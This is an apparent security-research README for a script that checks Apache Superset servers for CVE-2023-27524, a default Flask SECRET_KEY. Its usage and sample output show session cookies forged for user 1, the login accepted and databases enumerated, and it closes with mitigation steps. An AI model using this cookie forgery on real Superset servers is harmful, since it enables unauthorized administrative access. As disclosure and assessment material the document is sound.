# CVE-2023-27524: Apache Superset Auth Bypass
Script to check if an Apache Superset server is running with an insecure default configuration (CVE-2023-27524). The script checks if a Superset server's session cookies are signed with any well-known default Flask SECRET_KEYs.

The `--validate` flag can be used to validate exploitability by enumerating databases using the Superset API.

## Blog Post
More details here:
[https://www.horizon3.ai/cve-2023-27524-insecure-default-configuration-in-apache-superset](https://www.horizon3.ai/cve-2023-27524-insecure-default-configuration-in-apache-superset-leads-to-remote-code-execution/)

## Usage

```
% python3 CVE-2023-27524.py -h                           
usage: CVE-2023-27524.py [-h] --url URL [--id ID] [--validate] [--timeout TIMEOUT]

optional arguments:
  -h, --help            show this help message and exit
  --url URL, -u URL     Base URL of Superset instance
  --id ID               User ID to forge session cookie for, default=1
  --validate, -v        Validate login
  --timeout TIMEOUT, -t TIMEOUT
                        Time to wait before using forged session cookie, default=5s
```

## Basic Example

```
% python3 CVE-2023-27524.py -u http://10.0.220.200:8088   
Got session cookie: eyJjc3JmX3Rva2VuIjoiZDBiYWI5ZmU0YTRjOWFiM2ZkMjc2YjA2ZDZiNWE0MDZmZmNkN2JkOCIsImxvY2FsZSI6ImVuIn0.ZEc0tw.X6y_rTie0yMP5oTFC6KNq8Me9ek
Decoded session cookie: {'csrf_token': 'd0bab9fe4a4c9ab3fd276b06d6b5a406ffcd7bd8', 'locale': 'en'}
Superset Version: 2.0.1
Vulnerable to CVE-2023-27524 - Using default SECRET_KEY: b'CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET'
Forged session cookie for user 1: eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZEc0tw.xmzJjq757QujOpk65jK0dLgCSDg
```

## Example with Proof of Exploitability

```
% python3 CVE-2023-27524.py -u http://10.0.220.200:8088 --validate
Got session cookie: eyJjc3JmX3Rva2VuIjoiMTY0ZWExNWJlMDhmNWM2ZmZmOGFhNTExZThhMjUzYjM1YWY5MTdlNiIsImxvY2FsZSI6ImVuIn0.ZEc07w.CAkEJ7AtDlpfvVok-w0JQVcJqa0
Decoded session cookie: {'csrf_token': '164ea15be08f5c6fff8aa511e8a253b35af917e6', 'locale': 'en'}
Superset Version: 2.0.1
Vulnerable to CVE-2023-27524 - Using default SECRET_KEY: b'CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET'
Forged session cookie for user 1: eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZEc07w.fOAFW0_5gLUTkIbeR_5AqEz2DoU
Sleeping 5 seconds before using forged cookie to account for time drift...
Got 302 on login, forged cookie appears to have been accepted
Enumerating databases
Found database examples
Found database PostgreSQL
Done enumerating databases
```

## Troubleshooting
If the script detects a SECRET_KEY in use but is not able to validate exploitability, it could be because:
- target server is integrated with SSO and user ids don't follow the auto-increment format (try the `--id` argument to set a specific user_id if you know it)
- no user has been configured yet
- time drift between target and your machine. Flask session cookies are signed with a timestamp element. Try increasing the 5 second sleep interval in code.

## Mitigations
Follow the [instructions here](https://superset.apache.org/docs/installation/configuring-superset/) to generate and configure a Flask SECRET_KEY. The `superset` CLI tool can be used to [rotate the SECRET_KEY](https://superset.apache.org/docs/installation/configuring-superset/#secret_key-rotation) so that existing database connection information is preserved.

## Follow the Horizon3.ai Attack Team on Twitter for the latest security research:
*  [Horizon3 Attack Team](https://twitter.com/Horizon3Attack)
*  [James Horseman](https://twitter.com/JamesHorseman2)
*  [Zach Hanley](https://twitter.com/hacks_zach)

## Disclaimer
This software has been created purely for the purposes of academic research and for the development of effective defensive techniques, and is not intended to be used to attack systems except where explicitly authorized. Project maintainers are not responsible or liable for misuse of the software. Use responsibly.
